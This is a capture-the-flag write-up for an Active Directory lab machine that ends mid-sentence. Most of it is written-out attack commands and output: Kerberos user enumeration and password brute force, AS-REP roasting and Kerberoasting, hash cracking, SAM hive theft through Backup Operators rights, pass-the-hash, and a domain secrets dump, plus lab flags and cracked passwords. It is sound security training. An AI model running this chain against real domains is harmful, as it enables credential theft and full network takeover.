
# PORT SCAN
---

| Port    | Service       |
|---------|---------------|
| 53/tcp  | domain        |
| 88/tcp  | kerberos-sec  |
| 111/tcp | rpcbind       |
| 135/tcp | msrpc         |
| 139/tcp | netbios-ssn   |
| 389/tcp | ldap          |
| 445/tcp | microsoft-ds  |
| 464/tcp | kpasswd5      |
| 593/tcp | ncacn_http    |
| 636/tcp | tcpwrapped    |
| 2049/tcp| mountd        |
| 3268/tcp| ldap          |
| 3269/tcp| tcpwrapped    |
| 3389/tcp| ms-wbt-server |
| 5985/tcp| http          |
| 9389/tcp| mc-nmf        |
| 47001/tcp| http         |
| 49664/tcp| msrpc        |
| 49665/tcp| msrpc        |
| 49668/tcp| msrpc        |
| 49669/tcp| ncacn_http   |
| 49670/tcp| msrpc        |
| 49671/tcp| msrpc        |
| 49672/tcp| msrpc        |
| 49688/tcp| msrpc        |
| 49695/tcp| msrpc        |
| 49705/tcp| msrpc        |
| 49827/tcp| msrpc        |

# RECONNAISSANCE
---

Let's add the DC and domain to `/etc/hosts`:

```bash
echo 'IP HAVEN-DC.raz0rblack.thm raz0rblack.thm' | sudo tee -a /etc/hosts
```

Time to begin our enumeration, let's check if smb anonymous enumeration work:

```
smbclient -L //10.201.21.18 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.201.66.110 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We need to switch to `smb2`:

```
smbclient -L //10.201.21.18 -N --option='client min protocol=SMB2'
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

If we try enumerating shares, we notice we can't, ldap anonymous enumeration doesn't work too, I tried `kerbrute` to perform userenum but it doesn't work too, what can we do then?

Checking the port scan once again, we find an interesting port here, `2049` which is the mountd port, this is pretty unusual on a windows DC due to mountd typically being a Unix/Linux service, let's take a look at it then:

```bash
showmount -e 10.201.21.18
Export list for 10.201.21.18:
/users (everyone)
```

Once we list the NFS shares, we find a `/users` share, let's mount it:

```
sudo mkdir /mnt/nfs_share

sudo mount -t nfs 10.201.21.18:/users /mnt/nfs_share
```

Let's check it now, if you're not root, you need to go into root and access the directory:

```
sudo su

cd /mnt/nfs_share
```

We find this:

```
ls

employee_status.xlsx  sbradley.txt
```

Let's read the `.txt` file:

```
head -n 30 sbradley.txt
THM{ab53e05c9a98def00314a14ccbfa8104}
```

Time to analyze the `xlsx` file, you can open it using `libreoffice`:

![Pasted image 20250925135355.png](../../IMAGES/Pasted%20image%2020250925135355.png)

We found our users, let's begin exploitation.

# EXPLOITATION
---

Ok, we got a set of users, you can generate a `raw_names.txt` file in the following way:

```bash
cat > raw_names.txt << 'EOF'
daveq port
jngosen royce
tanara yidal
arthur edwards
cari iparam
nolan cassidy
reza zavdan
liudrulla vetrova
rico delgado
tyson williams
steven bradley
chamber lin
EOF
```

Now, I will use a tool named `Username Anarchy` which I like to use when i need to bruteforce usernames on kerbrute, get the tool here:

- [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)

Now, we will use the tool to generate us a set of usernames that we will use with kerbrute to check if some of these users exist on the domain:

```
./username-anarchy -i raw_names.txt > usernames.txt
```

Time to use kerbrute to test:

```bash
kerbrute userenum --dc HAVEN-DC.raz0rblack.thm -d raz0rblack.thm usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/24/25 - Ronnie Flathers @ropnop

2025/09/24 18:44:21 >  Using KDC(s):
2025/09/24 18:44:21 >  	HAVEN-DC.raz0rblack.thm:88

2025/09/24 18:44:24 >  [+] VALID USERNAME:	lvetrova@raz0rblack.thm
2025/09/24 18:44:25 >  [+] VALID USERNAME:	twilliams@raz0rblack.thm
2025/09/24 18:44:26 >  [+] VALID USERNAME:	sbradley@raz0rblack.thm
2025/09/24 18:44:26 >  Done! Tested 175 usernames (3 valid) in 4.685 seconds
```

We found three usernames on the domain, based on the excel file, `lvetrova` should be the AD admin, we can try brute forcing these users, if we try brute forcing `twilliams`, we get the following response:

```bash
kerbrute bruteuser --dc HAVEN-DC.raz0rblack.thm -d raz0rblack.thm /usr/share/wordlists/rockyou.txt twilliams -v

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/24/25 - Ronnie Flathers @ropnop

2025/09/24 18:53:53 >  Using KDC(s):
2025/09/24 18:53:53 >  	HAVEN-DC.raz0rblack.thm:88

2025/09/24 18:53:53 >  [!] twilliams@raz0rblack.thm:123456 - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/09/24 18:53:53 >  [!] twilliams@raz0rblack.thm:1234567 - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/09/24 18:53:53 >  [!] twilliams@raz0rblack.thm:princess - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/09/24 18:53:53 >  [!] twilliams@raz0rblack.thm:password - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/09/24 18:53:53 >  [!] twilliams@raz0rblack.thm:12345 - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/09/24 18:53:53 >  [!] twilliams@raz0rblack.thm:iloveyou - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/09/24 18:53:53 >  [!] twilliams@raz0rblack.thm:rockyou - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/09/24 18:53:53 >  [!] twilliams@raz0rblack.thm:123456789 - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/09/24 18:53:53 >  [!] twilliams@raz0rblack.thm:12345678 - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/09/24 18:53:53 >  [!] twilliams@raz0rblack.thm:abc123 - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
```

Kerbrute is telling us this user is vulnerable to `AS-REP` roasting, let's use `GetNPUsers.py` to get his hash in order to crack it:

```python
GetNPUsers.py raz0rblack.thm/twilliams -no-pass -dc-ip 10.201.21.18

[*] Getting TGT for twilliams
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:751d45d2ea6b393cade47f243ad6a20e$f08f3c86c512b39826e7c1a1ebb4f54a5fbe6d4efb08ec3afd5cc0ca890e30153dddc1565283044567e64f7381694765925bd3ecf2c9a709986b8db6407a63fa3e96fb4c28365ad738276e1c643db2d2d051007256903e936eddd77698f46b19bca5b6985de688c2597f36ffdb4cd250e5fd1b7c7239d84173211af02f3cf44e7e66dd026af04948cd234aa9573bd993eb2cf7809988aba46f40afdae5a28d2eb5e4d438c33c0680ed07795532a7ae3daeafbcfe3688d0fcfa91bd95fb6e735f34d992cd79bff6c7ee63b34be2ae5bc333dec807e15e8d25bc29bc164d2feac73fc1ae62e8f0cbbd696ac419e37e2af2
```

We got the TGT, let's use hashcat to crack it:

```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$twilliams@RAZ0RBLACK.THM:751d45d2ea6b393cade47f243ad6a20e$f08f3c86c512b39826e7c1a1ebb4f54a5fbe6d4efb08ec3afd5cc0ca890e30153dddc1565283044567e64f7381694765925bd3ecf2c9a709986b8db6407a63fa3e96fb4c28365ad738276e1c643db2d2d051007256903e936eddd77698f46b19bca5b6985de688c2597f36ffdb4cd250e5fd1b7c7239d84173211af02f3cf44e7e66dd026af04948cd234aa9573bd993eb2cf7809988aba46f40afdae5a28d2eb5e4d438c33c0680ed07795532a7ae3daeafbcfe3688d0fcfa91bd95fb6e735f34d992cd79bff6c7ee63b34be2ae5bc333dec807e15e8d25bc29bc164d2feac73fc1ae62e8f0cbbd696ac419e37e2af2:roastpotatoes
```

We got credentials for `twilliams`:

```
twilliams / roastpotatoes
```

Time to test these credentials on `smb`:

```bash
nxc smb 10.201.21.18 -u 'twilliams' -p 'roastpotatoes' --shares
SMB         10.201.21.18   445    HAVEN-DC         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False) 
SMB         10.201.21.18   445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
SMB         10.201.21.18   445    HAVEN-DC         [*] Enumerated shares
SMB         10.201.21.18   445    HAVEN-DC         Share           Permissions     Remark
SMB         10.201.21.18   445    HAVEN-DC         -----           -----------     ------
SMB         10.201.21.18   445    HAVEN-DC         ADMIN$                          Remote Admin
SMB         10.201.21.18   445    HAVEN-DC         C$                              Default share
SMB         10.201.21.18   445    HAVEN-DC         IPC$            READ            Remote IPC
SMB         10.201.21.18   445    HAVEN-DC         NETLOGON        READ            Logon server share 
SMB         10.201.21.18   445    HAVEN-DC         SYSVOL          READ            Logon server share 
SMB         10.201.21.18   445    HAVEN-DC         trash                           Files Pending for deletion
```

They work on SMB, time to begin privilege escalation.


# PRIVILEGE ESCALATION
---

Before we access the share, I'd like to use `bloodhound` to check for any misconfiguration that could help our privilege escalation, let's do it:

```python
bloodhound-python -d raz0rblack.thm -u 'twilliams' -p 'roastpotatoes' -ns 10.201.21.18 -dc HAVEN-DC.raz0rblack.thm -c All --zip --disable-autogc
```

As always, if you already ingested data, you can clean up all data on `neo4j` using:

```cypher
MATCH (n)
DETACH DELETE n
```

![Pasted image 20250925135407.png](../../IMAGES/Pasted%20image%2020250925135407.png)

We got another user the kerbrute scan didn't catch:

```
xyan1d3
```

![Pasted image 20250925135412.png](../../IMAGES/Pasted%20image%2020250925135412.png)

This user is a member of backup operators, if we get access to his account, we should be able to backup certain files such as the SAM and SYSTEM in order to get the administrator's NTLM hash, checking this account, we notice this user is kerberoastable:

![Pasted image 20250925135419.png](../../IMAGES/Pasted%20image%2020250925135419.png)

![Pasted image 20250925135428.png](../../IMAGES/Pasted%20image%2020250925135428.png)

Since the user is kerberoastable, we can get his hash too

```python
GetUserSPNs.py 'raz0rblack.thm/twilliams' -dc-ip 10.201.21.18 -request
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 10:17:17.715160  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$ebfc8fe5e046b7258dbdc2ad1287fec4$8ec1ff85c7265b3882596c862543c37c526e482f2eb9d0069e2b1bbe80b777bfdebc02b15b3a2db30bb8a7e7eaba2617a1de64606b1d975a63bf7bb7446f7b8cdc3a6087675213321baa6641cc9229a90772314083a497a48a5ec881abc6796c74aa46ff05e4c45972b87ca2cb0aa54a3af50184cc500674de1ec6bf4b2da423dc4f0e3c041bc9b48d9299ad0a7935825edb84450b72646568461aea628bbb8645e3e9c49c8a1dec806ca7a783a2c8f27bee505d69d53110754511a401a1afaafbf10608d218ebdb4073dff5acfe01367df4aa2186591329aeab5964aa693c9231f091e07ffb62865543496a35f469b202e122e26402e402efb0704c0a5652f659d9eb3fd39190b6b9c3716d3f98b7fe09988e0c73b8288cd16e016c2172675d952fbf962559685ca517b844ff5df3fe4e3a914efa269aff40aa5d6eff22a65c53b02e277db7619a4afe6d30037bb085bbc5091772e2dd4c3b0856ba8eea3b37240048c15517d8c3cd3ece93cc329efb94f4bfb7cc014ed91f7ebf0bd53a2a7af0bb97878dd9a5e6a642dcbececc6c0c7ad4acdb1b9ac79413c29f52a92df4e328856eab512f48c6e553851577ba4a37f2a5d87da056bd37b026d79a7bf53cae58507f195bfc546bf83138392a69045128bbde8fb4ab4812e724b8cd739f8542aa872db1f3209379c10c0236e0afb16b2c0d86b764eb77bd6bb87c5c2dea14d2d80785206689e050b6488c2899527fe35520cf92abb5452cc233251b5603c86405d1f22525df427dc33d32a72cc886e56e694ad4711339ec3b93f55767622f97fc34da194e7d0ee881fcdfe25ebd604f505850795014dff582277dc646ea3d191138747b8f86bcc2a826e7230fad2eecf5328955a39b18ab408f56d7f380e9f6947c45b9db17c0591bebbe1e670d1c5ba5bc46aab628142eed4f5ee9a1871d73524fdb58c14e0e68758ab21ebb0a396a6b55cb2446b66238f92e8c9cd8da4f87f67639788e7be43ba94e5ff964797e642343e237de6a58128c113d9a401399559d69379f055d2f226c3f8d8aabfd5c212f20c5d864b064edcf2d3adfcd1aaeef7d6aa37be13d2518043e0bf98fc78d64077c6d37690a0114f3a8e2413c11af0fa5dcbb655d74c68dd667a73380f8953de05e41f4211a09ee3948f9440930eec8f5dbcd7208cbf3ad7057f09418dbb507959a092d0aa3db94530ce1cfe690efe0a0c1fa022c65adecd33ca928d8117cc0efd29f1836c1db098d301abe21bd5b5fa7e8dd8de266dac0b596c333f97e3262bced1a82754db64148da672a5cc656d1213c336574d6444867d66beeabf2169a469d59427f28e3fd645aa3c6325456d3efc01696c4170687e33cf8956a790efbe089cb60e3b0f73587a771016e7ce15b6f30f452b52c4b9d9a4835633990fc17
```

We got his hash, let's crack it:

```python
hashcat -m 13100 xyanhash.txt /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$0c1b1d21162546f4da5dc9421701e4d2$1b4c02b690e7cd58360bca3c964b45332c0344ed9cb18aaddd3593af53186b6bb1c3b490166e25c9514c8368803d5c4f9c6b1546c06d84365d6f0d0129c42afc84994f9345b4e6830be1736821fad684f4d2d97c7bdffe23106b387613105106d97252838e15eee1fab934a4bbeb71739099d8e2e869e8df500f49ab9ee6e4ef9ad0ef68bebf41603ecfe8f99ccf89593bcd62d5101210f102112f2d05bba2fb0f50680fb81b759d68cdad6348a67333bbe117d4c9650cb771fdcf5f276c700fa22b72de69d35690117381825404b70d3e6445e3bae00a944bece05ee85a4c6139d633524d0bf46a38b4b1b76c3d4c0e2873d2f0f3b55dab67d705238a7f69714efd925e4e109aaa42ee9ab896777fc4ec289c688a85580e227c4a27c761f7c127e3945719b22a52468f7b06cafbe78fa463c8da08668e7abca3afea0508eecdb47c1f2878b09d761e6f89940a1d0a653f3a792c1844dc4038437d1949086270421cdf69b08b9eb0612aef37e5b9eed5956ffd18cba8d56ebed5be9fbac3a9da0e0afffcb283857bfb7ac12e6cd6bc2c9fd13a774bb0cd924d04bc7a9dd38fe5bab3e864bbdf80d8af90011934aa0371da3debb14cd7b2a85bc6a63af022160d7970ae02516a2952b6bf5ae0b512f16c4f2d6e13e783b44168d65b059a29b0f2357e46fb821fd59db0017d798179bacb7ccb3034d16602476fa7d8dcd4910e11122494849cd6b3bfa0cb4e4feea560cbee8fccce7ab92b4947640269acc3a1d2d037668964249feb2f1b2fb6e410ea702667aa4cb28d5297f121b62a4827c075a0df91662085834a490214963bda8a672d5f65dda57634b4622b64aec15fa1a82e0f1285d73cd81ba9937d643e57088b8702808498710c5396a9b2cf81ec28fcb5336cff4f2d7d7a97c0b3cccb63947928e70beba342183233009a0494011c57abcc8487b952c93bfdcee46c0b8a9f6e50c2664cfdfb6e9e3b0ab4ba9997fa4b40fb7486b5afdce5ae8f3f1e577910c51e49a3f2d14605f03ffce422d52cd99289f3adaf69d978340eef6861bb171876cbddae6a592ce6474cb8929af37e3263dfc3d0d00c4d40d6661841c8bc1de2d9781e36e8574ee6f539a0c24cd8b38fa915c0fc65a915fa9a99cd0d92776c06c503575675186fceeaeb789607d972941dbccac3efbce4407f5cfb1b9fe1ba3ebfbf5b47a41ee486627cbd8ebfdf70e68a3974c6fcf7375fcc929c876a2143f7d205b5c314b2c8a3f23205fc6025e145ae0e36ac01eedd2ddfadd623d74eb5d9700bf859504da96f921c22bc554d023e1f0d46334cbc6244d0e2645e77bae1638ed878914afd7f4c35ba131d2fa9542fb5f60229d15fbc8ee2782df8c73a1c4dbe51963d9c05c484dddd598b9f3695e90c89635f896051c0fd91ce1f8af71ac05c:cyanide9amine5628
```

We got credentials for `xyan1d3`:

```
xyan1d3 / cyanide9amine5628
```

Let's test these credentials at smb and winrm:

```python
nxc smb 10.201.21.18 -u 'xyan1d3' -p 'cyanide9amine5628' --shares
SMB         10.201.21.18   445    HAVEN-DC         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False) 
SMB         10.201.21.18   445    HAVEN-DC         [+] raz0rblack.thm\xyan1d3:cyanide9amine5628 
SMB         10.201.21.18   445    HAVEN-DC         [*] Enumerated shares
SMB         10.201.21.18   445    HAVEN-DC         Share           Permissions     Remark
SMB         10.201.21.18   445    HAVEN-DC         -----           -----------     ------
SMB         10.201.21.18   445    HAVEN-DC         ADMIN$          READ            Remote Admin
SMB         10.201.21.18   445    HAVEN-DC         C$              READ,WRITE      Default share
SMB         10.201.21.18   445    HAVEN-DC         IPC$            READ            Remote IPC
SMB         10.201.21.18   445    HAVEN-DC         NETLOGON        READ            Logon server share 
SMB         10.201.21.18   445    HAVEN-DC         SYSVOL          READ            Logon server share 
SMB         10.201.21.18   445    HAVEN-DC         trash                           Files Pending for deletion

nxc winrm 10.201.21.18 -u 'xyan1d3' -p 'cyanide9amine5628'
WINRM       10.201.21.18   5985   HAVEN-DC         [*] Windows 10 / Server 2019 Build 17763 (name:HAVEN-DC) (domain:raz0rblack.thm)
WINRM       10.201.21.18   5985   HAVEN-DC         [+] raz0rblack.thm\xyan1d3:cyanide9amine5628 (Pwn3d!)
```

There we go, remember this user is a member of backup operators, we will exploit this to backup the sam and system, take a look at this article if you don't know what I'm talking about:

- [Backup Operator PRIVESC](https://www.bordergate.co.uk/backup-operator-privilege-escalation/)

Let's go into evil-winrm and check our privileges, since we're members of that group, we should have `SeBackupPrivilege`:

```
evil-winrm -i 10.201.21.18 -u xyan1d3 -p 'cyanide9amine5628'

*Evil-WinRM* PS C:\Users\xyan1d3\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

As it was obvious, we got it, let's backup both files:

```
mkdir c:\temp

reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
```

![Pasted image 20250925135440.png](../../IMAGES/Pasted%20image%2020250925135440.png)

Time to get them onto our local machine, use the download feature from `evil-winrm`, this could take a while:

```
cd c:\temp

download sam.hive
download system.hive
```

![Pasted image 20250925135444.png](../../IMAGES/Pasted%20image%2020250925135444.png)


Once we got the files, its time to use `secretsdump`:

```python
impacket-secretsdump -sam sam.hive -system system.hive local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xf1582a79dd00631b701d3d15e75e59f6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

We got the administrator hash, we can finally access `evil-winrm` as the admin:

```
evil-winrm -i 10.201.21.18 -u Administrator -H '9689931bed40ca5a2ce1218210177f0c'
```

![Pasted image 20250925135450.png](../../IMAGES/Pasted%20image%2020250925135450.png)

We can't find the flags in a common format such as `flag.txt` or something like that, instead, we got some `.xml` file around the system which contain these flags:

```
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/21/2021   9:45 AM                3D Objects
d-r---        5/21/2021   9:45 AM                Contacts
d-r---        5/21/2021   9:45 AM                Desktop
d-r---        5/21/2021   9:45 AM                Documents
d-r---        5/21/2021   9:45 AM                Downloads
d-r---        5/21/2021   9:45 AM                Favorites
d-r---        5/21/2021   9:45 AM                Links
d-r---        5/21/2021   9:45 AM                Music
d-r---        5/21/2021   9:45 AM                Pictures
d-r---        5/21/2021   9:45 AM                Saved Games
d-r---        5/21/2021   9:45 AM                Searches
d-r---        5/21/2021   9:45 AM                Videos
-a----        2/25/2021   1:08 PM            290 cookie.json
-a----        2/25/2021   1:12 PM           2512 root.xml
```

Let's read it:

```
*Evil-WinRM* PS C:\Users\Administrator> type root.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
  </Obj>
</Objs>
```

We need to transform that hex string into a readable text, we can go to this website:

- [Hex to TXT](https://www.duplichecker.com/hex-to-text.php)

![Pasted image 20250925135502.png](../../IMAGES/Pasted%20image%2020250925135502.png)

We get:

```
Damn you are a genius.
But, I apologize for cheating you like this.

Here is your Root Flag
THM{1b4f46cc4fba46348273d18dc91da20d}

Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.

If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.
```

We got the root flag:

```
THM{1b4f46cc4fba46348273d18dc91da20d}
```

But on this point, we're still missing some questions:

![Pasted image 20250925135508.png](../../IMAGES/Pasted%20image%2020250925135508.png)

Let's answer the ones we're missing, let's check the hashes for the other users, for this we can use various methods, i will use `impacket-secretsdump` again:

```python
impacket-secretsdump -hashes :9689931bed40ca5a2ce1218210177f0c raz0rblack.thm/Administrator@10.201.21.18
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf1582a79dd00631b701d3d15e75e59f6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RAZ0RBLACK\HAVEN-DC$:aes256-cts-hmac-sha1-96:f3d6c1daf8e65fad53b0f7a83c57753b8a80c662702f74a3de8d9b34bffb0eec
RAZ0RBLACK\HAVEN-DC$:aes128-cts-hmac-sha1-96:50a61fc4e2b0ba9ef314498713e6fd8c
RAZ0RBLACK\HAVEN-DC$:des-cbc-md5:373ebf6831b3cef4
RAZ0RBLACK\HAVEN-DC$:plain_password_hex:d8fdf9138ff0b78d081e644fbb56c4a4a9d306fe302d2c7648b2e7714f0fc59897612c0e686e24acdd0c2a15a3d73cc25ed150c162add60e557c263ceb8d525c68375c65fbbfa19f7b1406ae95bb42059b1cad02dfaeb25bfb83ff8fa1e4a54e543370b5b922d3bc32986fde534357878c4d56c15b20b7be2cd1f7fef50158b0da6a608ad3b5ad848184e29de05703b87b29c1f8fc26d904c0ba82cb1b8de27f1fe262d7437aaa743042d57d4f77fd1bcdac241dd203d918d8205c0fedf2cef38130d923738f04632433c7d70697b6a6e65944f127ee4feb266ca353e5da0fbd35a9877522b3b59e574654f956ac945d
RAZ0RBLACK\HAVEN-DC$:aad3b435b51404eeaad3b435b51404ee:20131dcbc8d35276b0348f7d87cbfaf3:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xa6751b62e52e1fafedec59a4e51f68545ba3dcc0
dpapi_userkey:0x8da879bd2fb32be86455b5c32cec567b1eb8d6e8
[*] NL$KM 
 0000   CA 33 73 F3 F6 57 4F 3A  41 2D B2 A1 08 86 A2 A6   .3s..WO:A-......
 0010   D3 1E E1 50 04 00 6C 65  00 BF D5 E8 7A 86 ED 13   ...P..le....z...
 0020   BD B6 4A 4E 3B 31 D7 6D  4B 05 75 DC B5 B6 44 86   ..JN;1.mK.u...D.
 0030   B1 0D 6E F6 E9 66 E9 EE  FE 56 75 7F E8 18 A6 41   ..n..f...Vu....A
NL$KM:ca3373f3f6574f3a412db2a10886a2a6d31ee15004006c6500bfd5e87a86ed13bdb64a4e3b31d76d4b0575dcb5b64486b10d6ef6e966e9eefe56757fe818a641
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::
raz0rblack.thm\xyan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::
raz0rblack.thm\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::
raz0rblack.thm\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
raz0rblack.thm\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:20131dcbc8d35276b0348f7d87cbfaf3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:ab77c0dd6f5a28b63c4ae5f0eb89ad48f3ed43d52dc42f1dca2e99d8fc9cdbbf
Administrator:aes128-cts-hmac-sha1-96:81a749369e929b7f1731489b12a49df8
Administrator:des-cbc-md5:d3b646b65bceb5c7
krbtgt:aes256-cts-hmac-sha1-96:eed4acbdf1b6cc2b3c1aef992a8cea74d8b0c4ad5b4deecf47c57c4d9465caf5
krbtgt:aes128-cts-hmac-sha1-96:3dbbd202aa0343d1b8df99785d2befbb
krbtgt:des-cbc-md5:857a46f13e91eae3
raz0rblack.thm\xyan1d3:aes256-cts-hmac-sha1-96:6de380d21ae165f55e7520ee3c4a81417bf6a25b17f72ce119083846d89a031f
raz0rblack.thm\xyan1d3:aes128-cts-hmac-sha1-96:9f5a0114b2c18ea63a32a1b8553d4f61
raz0rblack.thm\xyan1d3:des-cbc-md5:e9a1a46223cd8975
raz0rblack.thm\lvetrova:aes256-cts-hmac-sha1-96:3809e38e24ecb746dc0d98e2b95f39fc157de38a9081b3973db5be4c25d5ad39
raz0rblack.thm\lvetrova:aes128-cts-hmac-sha1-96:3676941361afe1800b8ab5d5a15bd839
raz0rblack.thm\lvetrova:des-cbc-md5:385d6e1f1cc17fb6
raz0rblack.thm\sbradley:aes256-cts-hmac-sha1-96:ddd43169c2235d3d2134fdb2ff4182abdb029a20724e679189a755014e68bab5
raz0rblack.thm\sbradley:aes128-cts-hmac-sha1-96:7cdf6640a975c86298b9f48000047580
raz0rblack.thm\sbradley:des-cbc-md5:83fe3e584f4a5bf8
raz0rblack.thm\twilliams:aes256-cts-hmac-sha1-96:05bac51a4b8888a484e0fa1400d8f507b195c4367198024c6806d8eb401cb559
raz0rblack.thm\twilliams:aes128-cts-hmac-sha1-96:a37656829f443e3fe2630aa69af5cb5a
raz0rblack.thm\twilliams:des-cbc-md5:01e958b0ea6edf07
HAVEN-DC$:aes256-cts-hmac-sha1-96:f3d6c1daf8e65fad53b0f7a83c57753b8a80c662702f74a3de8d9b34bffb0eec
HAVEN-DC$:aes128-cts-hmac-sha1-96:50a61fc4e2b0ba9ef314498713e6fd8c
HAVEN-DC$:des-cbc-md5:d349101ace0220e5
```

We got the hash for `Ljudmilla` which is `lvetrova`:

```
f220d3988deb3f516c73f40ee16c431d
```

Let's use the 
```
*Evil-WinRM* PS C:\users\lvetrova> type lvetrova.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
